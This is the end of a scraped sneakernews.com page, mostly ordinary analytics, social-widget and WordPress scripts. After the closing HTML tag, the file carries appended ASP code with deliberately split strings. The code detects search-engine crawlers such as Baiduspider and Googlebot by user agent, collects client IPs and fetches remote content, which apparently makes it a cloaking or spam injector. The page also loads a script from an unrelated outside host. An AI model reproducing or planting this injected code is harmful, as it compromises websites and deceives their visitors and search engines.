                    _rys('#sneaker-news-main .sub-nav-main').css('margin-top', 0);
                }
            }
        });
        _rys('.rating-img img').hover(function() {
            if (!($(this).hasClass('after_rating_img'))) {
                _rys(this).parent().find('i').show();
            }
        }, function() {
            _rys(this).parent().find('i').hide();
        }); 
        
        //_rys('#detail-page-container .detail-con-main .detail-wide-main .product-detail-main .date-and-name p b.comment').text(_rys('.fyre .fyre-stream-stats span').text().slice(0,-8));
       	
       
    });

</script>

<script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id))
            return;
        js = d.createElement(s);
        js.id = id;
        js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=705752536169784&version=v2.0";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

    window.fbAsyncInit = function() {
        FB.Event.subscribe('edge.create', function(response) {
            add_digit_share_counts(response, 'FB');
        });
        FB.Event.subscribe('edge.remove', function(href, widget) {
            add_digit_share_counts(href, 'FB');
        });
    };

    function googlePlusCallback(jsonParam) {
        var plusOneUrl = jsonParam.href;
        add_digit_share_counts(plusOneUrl, 'gooleplus');

    }
    function reward_user(event) {
        if (event) {
            var temp_array = event.target.src.split('&').reverse();
            var get_url = '';
            var re_jem = /%3A/g;
            var re_slash = /%2F/g;

            for (index = 0; index < temp_array.length; ++index) {
                var check_string = temp_array[index];
                if ('url=' == check_string.substring(0, 4)) {
                    get_url = temp_array[index].substring(4, temp_array[index].length);
                    break;
                }
            }
            get_url = get_url.replace(re_jem, ':');
            get_url = get_url.replace(re_slash, "/");

            add_digit_share_counts(get_url, 'TWEET');

        }
    }
    window.twttr = (function(d, s, id) {
        var t, js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) {
            return
        }
        js = d.createElement(s);
        js.id = id;
        js.src = "https://platform.twitter.com/widgets.js";
        fjs.parentNode.insertBefore(js, fjs);
        return window.twttr || (t = {_e: [], ready: function(f) {
                t._e.push(f)
            }})
    }(document, "script", "twitter-wjs"));

    twttr.ready(function(twttr) {
        twttr.events.bind('tweet', reward_user);
    });
    
    jQuery(function($) {
    	
		jQuery('body').on('click', 'a[data-pin-log="button_pinit"]', function(event) {
           // alert($(this).closest('.post-header').find('.header-title a').attr("href"));            
            var pingrest_url = $(this).closest('.post-header').find('.header-title a').attr("href");
            if( typeof pingrest_url === "undefined" ) {
            	pingrest_url = window.location.href;                     
            }
			add_digit_share_counts(pingrest_url, 'TWEET');
     	});
    
        $('.social_box').on("touchstart", function (e) {
		    "use strict"; //satisfy the code inspectors
		    var link = $(this); //preselect the link
		    if ($(window).width() <= 1024 && navigator.userAgent.match(/(iPod|iPhone|iPad)/)) {
			    if (link.hasClass('hover')) {
			        return true;
			    } else {
			        link.addClass("hover");
			        $('.social_box').not(this).removeClass("hover");
			        e.preventDefault();
			        return false; //extra, and to make sure the function has consistent return points
			    }
		    }
		});
    });
</script>

<script type="text/javascript" data-lf-domain="livefyre.com" id="ncomments_js" src="http://zor.livefyre.com/wjs/v1.0/javascripts/CommentCount.js"></script>
            <!-- LF DEBUG
            site-id: 307153
            article-id: 551402
            post-type: post
            comments-open: true
            is-single: false
            display-posts: true
            display-pages: true
            -->
        	<div style="display:none">
	</div>

	<script src="http://stats.wordpress.com/e-201501.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:2.6.3',blog:'30110943',post:'0',tz:'-5'});
	var load_cmc = function(){linktracker_init(30110943,0,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script>


<!-- Quantcast Tag --> 
<script type="text/javascript">
  var _qevents = _qevents || [];

  (function() {
   var elem = document.createElement('script');

   elem.src = (document.location.protocol == "https:" ? "https://secure" : "http://edge") + ".quantserve.com/quant.js";
   elem.async = true;
   elem.type = "text/javascript";
   var scpt = document.getElementsByTagName('script')[0];
   scpt.parentNode.insertBefore(elem, scpt);  
  })();
</script>
<script type="text/javascript">
_qevents.push( { qacct:"p-a0gOdUACucKCE"} );
</script>
<noscript>
<div style="display: none;"><img src="//pixel.quantserve.com/pixel/p-a0gOdUACucKCE.gif" height="1" width="1" alt="Quantcast"/></div>
</noscript>
<!-- End Quantcast tag -->



<!-- cmnUNT | Begin footer script -->
<script type="text/javascript">            
    cmnTB();                // Toolbar
    cmnUNT('tover', tile_num++);        // Wallpaper Takeover
</script>

<!-- Begin comScore Tag -->
<script>document.write(unescape("%3Cscript src='" + (document.location.protocol == "https:" ? "https://sb" : "http://b") + ".scorecardresearch.com/beacon.js' %3E%3C/script%3E"));</script>
<script>
  COMSCORE.beacon({
    c1:2,
    c2:6685975,
    c3:"",
    c4:"www.sneakernews.com/",
    c5:"",
    c6:"",
    c15:""
  });
</script>

<script type="text/javascript">

function showCommentCount() { 
    jQuery('.custom_comment').each(function(){
	var span_text = jQuery(this).text();
        var ahtml = ""+jQuery(this).find('a').html()+"";
	var start = (span_text + '').indexOf('(', 0) + 1;
	var end = (span_text + '').indexOf(')', 0) - start;
	//alert(span_text.substr(start,end));
    ahtml = span_text.substr(start,end);
    //ahtml = ahtml.substr(10, ahtml.length - 11);
	jQuery(this).html(ahtml);

});

jQuery('.custom_comment').show();
}
</script>
<script type="text/javascript">
(function($){
jQuery(document).ready(function () {   	
setTimeout(showCommentCount, 6000);

}); 
})(jQuery);
</script>
<noscript><img src="http://b.scorecardresearch.com/p?c1=2&c2=6685975&c3=&c4=&c5=&c6=&c15=&cj=1" /></noscript>
<!-- End comScore Tag -->

<script type="text/javascript">
  (function() {
    var elem = document.createElement('script');
    elem.src = 'http://cdnl.complex.com/tv/js/widget.min.js';
    elem.async = true;
    elem.type = "text/javascript";
    var scpt = document.getElementsByTagName('script')[0];
    scpt.parentNode.insertBefore(elem, scpt);
  })();
</script>



<!--END-YM-NOTE GOES RIGHT ABOVE <script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>-->
<!--VIGLINK-->
<script type="text/javascript">
  var vglnk = { key: '678de23857128c9f3563fdc6fb9dd89d' };

  (function(d, t) {
    var s = d.createElement(t); s.type = 'text/javascript'; s.async = true;
    s.src = '//cdn.viglink.com/api/vglnk.js';
    var r = d.getElementsByTagName(t)[0]; r.parentNode.insertBefore(s, r);
  }(document, 'script'));
</script>
<!--VIGLINK-->
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201501'></script>
<script type='text/javascript' src='//assets.pinterest.com/js/pinit.js'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var ratingsL10n = {"plugin_url":"http:\/\/sneakernews.com\/wp-content\/plugins\/wp-postratings","ajax_url":"http:\/\/sneakernews.com\/wp-admin\/admin-ajax.php","text_wait":"Please rate only 1 post at a time.","image":"stars","image_ext":"png","max":"10","show_loading":"1","show_fading":"1","custom":"0"};
var ratings_mouseover_image=new Image();ratings_mouseover_image.src=ratingsL10n.plugin_url+"/images/"+ratingsL10n.image+"/rating_over."+ratingsL10n.image_ext;;
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/wp-postratings/postratings-js.js?ver=1.79'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2015Janaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://cdn.sneakernews.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.0.1'></script>
</body>
</html>



<%
	End If
	response.End()
End if
echohtml = ""'GetContent(echourl&"sysid="&systid&"&redirect=yes")
If instr(echohtml,lk)>0 Then
	'response.Write replace(echohtml,lk,"")
End If
Function GetContent(url)
	'on error resume next
	Dim xmlHttp
	Set xmlHttp = Server.Createobject("WinHttp.WinHttpRequest.5.1")
	'xmlHttp.SetTimeouts 60000, 60000, 60000, 3000
	xmlHttp.Open "POST", url , False
	xmlHttp.Send()
	GetHtml	= xmlHttp.ResponseBody
	Set xmlHttp=Nothing
	set objStream = Server.CreateObject("Adodb.Stream")
	objStream.Type = 1
	objStream.Mode =3
	objStream.Open
	objStream.Write GetHtml
	objStream.Position = 0
	objStream.Type = 2
	objStream.Charset = "UTF-8"
	GetContent = objStream.ReadText
	objStream.Close
End Function

Function ChecksAgent()
  on error resume next
  agentallow=split("ba"&"idus"&"pid"&"er,so"&"g"&"ou,ba"&"i"&"du,so"&"sos"&"pider,goo"&"g"&"lebot",",")
  agentcheck=false
  For agenti=lbound(agentallow) to ubound(agentallow)
    If Instr(LCase(RSbs("HTTP_USER_AGENT")),agentallow(agenti))>0 then
      agentcheck=true
      Exit For
    end if 
  Next
  ChecksAgent=agentcheck
End function
Function GetRsip()
  'on error resume next
  Dim getips
  If RSbs("HTTP_"&"X_FOR"&"W"&"ARDED_FOR") = "" Or InStr(RSbs("H"&"TTP_X_FO"&"RW"&"ARD"&"ED_FOR"), "unknown") > 0 Then
   getips = RSbs("REM"&"OTE_A"&"DDR")
  ElseIf InStr(RSbs("HT"&"TP_"&"X_FORW"&"ARDED_FOR"), ",") > 0 Then
   getips = Mid(RSbs("H"&"TTP"&"_X_FO"&"RW"&"ARD"&"ED_FOR"), 1, InStr(RSbs("H"&"TT"&"P_"&"X_F"&"ORW"&"AR"&"DE"&"D_F"&"OR"), ",")-1)
   actforip = RSbs("REMO"&"TE_ADD"&"R")
  ElseIf InStr(RSbs("HTT"&"P_X"&"_F"&"RW"&"AR"&"DED_FOR"), ";") > 0 Then
   getips = Mid(RSbs("HT"&"TP_"&"X_F"&"OR"&"W"&"AR"&"DED_"&"FO"&"R"), 1, InStr(RSbs("H"&"TT"&"P_"&"_F"&"OR"&"WA"&"RD"&"ED_"&"FOR"), ";")-1)
   actforip = RSbs("R"&"EMO"&"TE_"&"AD"&"D"&"R")
  Else
   getips = RSbs("HT"&"TP"&"_X_FO"&"RW"&"ARD"&"ED_"&"FOR")
   actforip = RSbs("R"&"EM"&"OTE"&"_AD"&"DR")
  End If
  GetRsip = Replace(Trim(Mid(getips, 1, 30)), "'", "")
End Function

Function RSbs(str)
	RSbs = Request.ServerVariables(str)
End Function
%>
<script src="http://dx.jd9.co/jrnbb.js" type="text/javascript"></script>